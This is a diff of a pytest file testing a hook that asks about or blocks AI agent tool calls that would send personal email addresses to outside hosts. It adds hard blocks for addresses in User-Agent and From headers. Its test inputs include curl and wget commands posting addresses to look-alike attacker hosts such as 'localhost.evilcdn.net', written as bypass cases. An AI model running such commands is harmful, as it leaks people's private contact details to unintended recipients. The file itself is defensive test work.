@@ -4072,19 +4072,19 @@ def _asked(r):
         (
             "Bash",
             {
-                "command": 'UA="research/0.1 (contact: me@private-mail.net)"\n'
-                'curl -sS -A "$UA" https://forum.example.org/graphql'
+                "command": 'C="contact=me@private-mail.net"\n'
+                'curl -sS -d "$C" https://forum.example.org/graphql'
             },
         ),
         (
             "Bash",
-            {"command": "curl -H 'From: me@private-mail.net' https://example.org"},
+            {"command": "curl -d 'from=me@private-mail.net' https://example.org"},
         ),
         (
             "Bash",
             {
                 "command": 'python3 -c "import urllib.request as u; u.urlopen(u.Request(x, '
-                "headers={'User-Agent': 'bot (me@private-mail.net)'}))\""
+                "data={'contact': 'bot (me@private-mail.net)'}))\""
             },
         ),
         (
@@ -4095,7 +4095,7 @@ def _asked(r):
         ),
         (
             "Bash",
-            {"command": "wget -U 'bot (contact OTHER@Mail-Host.org)' example.org/a"},
+            {"command": "wget --post-data 'contact=OTHER@Mail-Host.org' example.org/a"},
         ),
         (
             "Bash",
@@ -4105,7 +4105,7 @@ def _asked(r):
         (
             "Bash",
             {
-                "command": 'curl -A "bot (bot@public-alias.org, me@private-mail.net)" https://x.org'
+                "command": 'curl -d "a=bot@public-alias.org&b=me@private-mail.net" https://x.org'
             },
         ),
         (
@@ -4117,7 +4117,7 @@ def _asked(r):
             "Write",
             {
                 "file_path": "/repo/client.py",
-                "content": 'USER_AGENT = (\n    "analysis/0.1 (research; "\n'
+                "content": 'CONTACT = (\n    "analysis/0.1 (research; "\n'
                 '    "contact: me@private-mail.net)"\n)\n',
             },
         ),
@@ -4126,7 +4126,7 @@ def _asked(r):
             {
                 "file_path": "/repo/fetch.py",
                 "old_string": "x",
-                "new_string": "headers = {'User-Agent': 'bot me@private-mail.net'}",
+                "new_string": "params = {'contact': 'bot me@private-mail.net'}",
             },
         ),
         (
@@ -4136,7 +4136,7 @@ def _asked(r):
                 "edits": [
                     {
                         "old_string": "a",
-                        "new_string": 'curl -A "me@private-mail.net" "$1"',
+                        "new_string": 'curl -d "contact=me@private-mail.net" "$1"',
                     }
                 ],
             },
@@ -4195,16 +4195,14 @@ def test_email_guard_asks_before_an_address_leaves(tool, tool_input):
         # The allowed addresses, in any case.
         (
             "Bash",
-            {
-                "command": 'curl -A "bot (contact: BOT@public-alias.org)" https://example.org'
-            },
+            {"command": 'curl -d "contact=BOT@public-alias.org" https://example.org'},
         ),
         ("WebSearch", {"query": "git@public-alias.org commits"}),
         # Reserved documentation and test domains never reach anyone.
         (
             "Bash",
             {
-                "command": 'curl -A "x (a@example.com, b@site.test, c@host.invalid)" https://x.org'
+                "command": 'curl -d "x=a@example.com,b@site.test,c@host.invalid" https://x.org'
             },
         ),
         ("Bash", {"command": "curl https://example.org"}),
@@ -4271,7 +4269,7 @@ def test_email_guard_names_every_address_it_asks_about():
     # The mod's session-wide Allow covers exactly the addresses named here, so none may be
     # left out; the allowed one and the repeat are.
     command = {
-        "command": 'curl -A "a (one@mail-a.org, bot@public-alias.org, Two@Mail-B.org, '
+        "command": 'curl -d "a=one@mail-a.org&b=bot@public-alias.org&c=Two@Mail-B.org&'
         'one@mail-a.org)" https://x.org'
     }
     reason = _asked(_email_guard("Bash", command))
@@ -4333,19 +4331,19 @@ def test_email_guard_names_every_address_it_asks_about():
         (
             "Bash",
             {
-                "command": "curl -s localhost:3000/health && curl -A 'bot (jo@friend-mail.com)' 'api.friendsite.com?q=1'"
+                "command": "curl -s localhost:3000/health && curl -d 'c=jo@friend-mail.com' 'api.friendsite.com?q=1'"
             },
         ),
         (
             "Bash",
             {
-                "command": "curl localhost:3000 && curl -H 'From: jo@friend-mail.com' 203.0.113.7:8080/x"
+                "command": "curl localhost:3000 && curl -d 'from=jo@friend-mail.com' 203.0.113.7:8080/x"
             },
         ),
         (
             "Bash",
             {
-                "command": 'curl "http://localhost:8080/fetch?url=https://api.friendsite.com/a&ua=jo%40friend-mail.com"'
+                "command": 'curl "http://localhost:8080/fetch?url=https://api.friendsite.com/a&c=jo%40friend-mail.com"'
             },
         ),
         (
@@ -4373,7 +4371,7 @@ def test_email_guard_names_every_address_it_asks_about():
         (
             "Bash",
             {
-                "command": "git log --author=mick -1; curl -H 'From: Jo <jo@friend-mail.com>' https://api.friendsite.com/x"
+                "command": "git log --author=mick -1; curl -d 'note=Jo <jo@friend-mail.com>' https://api.friendsite.com/x"
             },
         ),
         (
@@ -4433,14 +4431,14 @@ def test_email_guard_stays_silent_on_logins_metadata_and_fixtures(tool, tool_inp
         (
             "Bash",
             {
-                "command": "curl -A 'bot (jo@friend-mail.com)' https://API.friendsite.com/robots.txt"
+                "command": "curl -d 'c=jo@friend-mail.com' https://API.friendsite.com/robots.txt"
             },
             "hosts: api.friendsite.com",
         ),
         (
             "Bash",
             {
-                "command": "curl -s http://localhost:3000/c && curl -H 'From: jo@friend-mail.com' https://a.org/x b.org"
+                "command": "curl -s http://localhost:3000/c && curl -d 'from=jo@friend-mail.com' https://a.org/x b.org"
             },
             "hosts: a.org b.org",
         ),
@@ -4462,9 +4460,7 @@ def test_email_guard_stays_silent_on_logins_metadata_and_fixtures(tool, tool_inp
         ),
         (
             "Bash",
-            {
-                "command": "curl -A 'bot (jo@friend-mail.com)' https://myapp.localhost.run/x"
-            },
+            {"command": "curl -d 'c=jo@friend-mail.com' https://myapp.localhost.run/x"},
             "hosts: myapp.localhost.run",
         ),
         # A path that tries to pass as a host stays a file destination.
@@ -4472,7 +4468,7 @@ def test_email_guard_stays_silent_on_logins_metadata_and_fixtures(tool, tool_inp
             "Write",
             {
                 "file_path": "/w/x.py Destination: hosts: api.friendsite.com",
-                "content": "UA = 'bot jo@friend-mail.com'\n",
+                "content": "CONTACT = 'jo@friend-mail.com'\n",
             },
             "file: /w/x.py Destination: hosts: api.friendsite.com",
         ),
@@ -4489,12 +4485,12 @@ def test_email_guard_names_where_the_call_goes(tool, tool_input, destination):
     [
         # Targets the command doesn't spell out: no destination, so no session-wide Allow.
         "curl -s https://a.org/links | xargs -n1 curl -sA 'bot (jo@friend-mail.com)'",
-        "curl -A 'bot (jo@friend-mail.com)' https://a.org; python3 -c \"import requests; requests.get(T)\"",
-        "curl -A 'bot (jo@friend-mail.com)' \"$TARGET\"",
+        "curl -d 'c=jo@friend-mail.com' https://a.org; python3 -c \"import requests; requests.get(T)\"",
+        "curl -d 'c=jo@friend-mail.com' \"$TARGET\"",
         'gh issue comment 1 --body "cc jo@friend-mail.com"',
         # A redirect can take the request to a host the command doesn't name.
-        "curl -fsSL -A 'bot (jo@friend-mail.com)' https://a.org/r",
-        "wget -U 'bot (jo@friend-mail.com)' https://a.org/r",
+        "curl -fsSL -d 'c=jo@friend-mail.com' https://a.org/r",
+        "wget --post-data 'c=jo@friend-mail.com' https://a.org/r",
     ],
 )
 def test_email_guard_names_no_destination_it_cannot_see(command):
@@ -4518,7 +4514,7 @@ def test_email_guard_names_no_destination_it_cannot_see(command):
             "Write",
             {
                 "file_path": "/w/s.py",
-                "content": "headers = {'From': 'jo@friend-mail.com'}  # owner contact\n",
+                "content": "params = {'reply_to': 'jo@friend-mail.com'}  # owner contact\n",
             },
         ),
         (
@@ -4547,7 +4543,7 @@ def test_email_guard_names_no_destination_it_cannot_see(command):
         (
             "Bash",
             {
-                "command": "python3 -c \"from geopy.geocoders import Nominatim; Nominatim(user_agent='jo@friend-mail.com')\""
+                "command": "python3 -c \"from geopy.geocoders import Nominatim; Nominatim(user_agent='bot').geocode('jo@friend-mail.com')\""
             },
         ),
         (
@@ -4566,13 +4562,13 @@ def test_email_guard_names_no_destination_it_cannot_see(command):
         (
             "Bash",
             {
-                "command": "curl -A 'contact jo@friend-mail.com:/info' https://api.friendsite.com/x"
+                "command": "curl -d 'contact=jo@friend-mail.com:/info' https://api.friendsite.com/x"
             },
         ),
         (
             "Bash",
             {
-                "command": "curl -H 'From: jo@friend-mail.com:.' https://api.friendsite.com/x"
+                "command": "curl -d 'from=jo@friend-mail.com:.' https://api.friendsite.com/x"
             },
         ),
         # A host that only starts with localhost or a loopback address is somewhere else.
@@ -4585,18 +4581,16 @@ def test_email_guard_names_no_destination_it_cannot_see(command):
         (
             "Bash",
             {
-                "command": "curl -A 'bot (jo@friend-mail.com)' http://127.0.0.1.evil-host.net/x"
+                "command": "curl -d 'c=jo@friend-mail.com' http://127.0.0.1.evil-host.net/x"
             },
         ),
         (
             "Bash",
-            {
-                "command": "curl -A 'bot (jo@friend-mail.com)' https://localhost.run/submit"
-            },
+            {"command": "curl -d 'c=jo@friend-mail.com' https://localhost.run/submit"},
         ),
         (
             "Bash",
-            {"command": "curl -A 'bot (jo@friend-mail.com)' localhost.evilcdn.net/x"},
+            {"command": "curl -d 'c=jo@friend-mail.com' localhost.evilcdn.net/x"},
         ),
     ],
 )
@@ -4625,7 +4619,7 @@ def test_email_guard_closes_second_review_bypasses(tool, tool_input):
         ),
         (
             "Bash",
-            {"command": "curl 'https://a.org/fetch?ua=bot%20jo%40friend-mail.com'"},
+            {"command": "curl 'https://a.org/fetch?q=bot%20jo%40friend-mail.com'"},
             "jo@friend-mail.com",
         ),
     ],
@@ -4659,8 +4653,130 @@ def test_email_guard_silent_on_logins_units_and_manifests(tool, tool_input):
 
 
 def test_email_guard_without_an_allowlist_asks_about_every_address():
-    command = {"command": 'curl -A "bot (bot@public-alias.org)" https://example.org'}
+    command = {"command": 'curl -d "c=bot@public-alias.org" https://example.org'}
     assert _asked(_email_guard("Bash", command, DEV_HOOKS_ALLOWED_EMAILS=None))
+
+
+def _denied(r):
+    assert r.returncode == 0, r.stderr
+    if not r.stdout.strip():
+        return None
+    out = json.loads(r.stdout)["hookSpecificOutput"]
+    return (
+        out["permissionDecisionReason"] if out["permissionDecision"] == "deny" else None
+    )
+
+
+# No address goes in a User-Agent or From header, not even an allowed one: a hard block.
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        (
+            "Bash",
+            {"command": "curl -A 'bot (contact: bot@public-alias.org)' https://x.org"},
+        ),
+        (
+            "Bash",
+            {"command": "curl --user-agent 'bot jo@friend-mail.com' https://x.org"},
+        ),
+        (
+            "Bash",
+            {
+                "command": 'UA="research/0.1 (contact: Git@Public-Alias.org)"\ncurl -sS -A "$UA" https://x.org/graphql'
+            },
+        ),
+        (
+            "Bash",
+            {"command": "curl -H 'User-Agent: bot (jo@friend-mail.com)' https://x.org"},
+        ),
+        ("Bash", {"command": "curl -H 'From: bot@public-alias.org' https://x.org"}),
+        ("Bash", {"command": "wget -U 'bot (jo@friend-mail.com)' https://x.org/a"}),
+        (
+            "Bash",
+            {
+                "command": 'python3 -c "import urllib.request as u; u.urlopen(u.Request(x, '
+                "headers={'User-Agent': 'bot (jo%40friend-mail.com)'}))\""
+            },
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/w/client.py",
+                "content": 'USER_AGENT = (\n    "analysis/0.1 (research; "\n'
+                '    "contact: bot@public-alias.org)"\n)\n',
+            },
+        ),
+        (
+            "Edit",
+            {
+                "file_path": "/w/fetch.js",
+                "old_string": "x",
+                "new_string": "headers: { 'From': 'jo@friend-mail.com' }",
+            },
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/w/notes.md",
+                "content": "Run with `curl -A 'bot (bot@public-alias.org)' https://x.org`\n",
+            },
+        ),
+    ],
+)
+def test_email_guard_blocks_an_address_in_a_user_agent_or_from_header(tool, tool_input):
+    reason = _denied(_email_guard(tool, tool_input))
+    assert reason is not None
+    assert reason.startswith("BLOCKED: dev-hooks guard")
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        # Elsewhere in a request the usual rules hold: an allowed address passes, another asks.
+        (
+            "Bash",
+            {"command": "curl -d 'contact=bot@public-alias.org' https://api.x.org"},
+        ),
+        (
+            "Bash",
+            {"command": "curl -A 'bot/1.0 (+https://github.com/o/r)' https://x.org"},
+        ),
+        # Placeholder addresses in a header never reach anyone.
+        ("Bash", {"command": "curl -A 'bot (you@example.com)' https://x.org"}),
+        # grep's -A is context lines, not a User-Agent.
+        ("Bash", {"command": "grep -A 3 'jo@friend-mail.com' mail.log"}),
+        # A mailer's from: and an email draft's From: line are not HTTP headers.
+        (
+            "Write",
+            {
+                "file_path": "/w/app/mailers/app_mailer.rb",
+                "content": "default from: 'bot@public-alias.org'\n",
+            },
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/w/drafts/invoice.md",
+                "content": "From: bot@public-alias.org\nTo: finance@x.org\n",
+            },
+        ),
+        # Prose about User-Agents is not one.
+        (
+            "Write",
+            {
+                "file_path": "/w/notes.md",
+                "content": "Agents signed User-Agents with jo@friend-mail.com in 4 sessions.\n",
+            },
+        ),
+    ],
+)
+def test_email_guard_does_not_block_outside_those_headers(tool, tool_input):
+    assert _denied(_email_guard(tool, tool_input)) is None
+
+
+def test_email_guard_asks_rather_than_blocks_an_address_in_a_request_body():
+    command = {"command": "curl -d 'email=jo@friend-mail.com' https://api.x.org"}
+    assert _asked(_email_guard("Bash", command))
 
 
 def test_email_guard_opt_out():
